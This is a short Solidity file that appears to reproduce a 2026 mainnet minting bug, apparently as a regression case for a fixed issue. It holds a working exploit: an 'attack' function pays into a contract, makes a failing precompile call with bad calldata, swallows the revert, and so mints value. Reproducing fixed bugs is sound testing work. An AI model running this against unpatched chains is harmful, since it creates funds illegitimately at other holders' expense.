// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

// Reproduces the 2026-11-22 mainnet mint. A payable frame receives value,
// calls a precompile with calldata it cannot decode, and reverts; the caller
// swallows the revert. Before the fix the value ended up on both sides of the
// reverted transfer and the evm module minted the difference.
contract PrecompileRevertInner {
    function poke(address precompile) external payable {
        (bool ok, ) = precompile.call(hex"dead");
        require(ok, "precompile decode failed");
    }

    function sweep(address payable to) external {
        to.transfer(address(this).balance);
    }

    receive() external payable {}
}

contract PrecompileRevertMinter {
    PrecompileRevertInner public inner;

    constructor() payable {
        inner = new PrecompileRevertInner();
    }

    function attack(address precompile, uint256 amount) external {
        try inner.poke{value: amount}(precompile) {} catch {}
    }

    receive() external payable {}
}
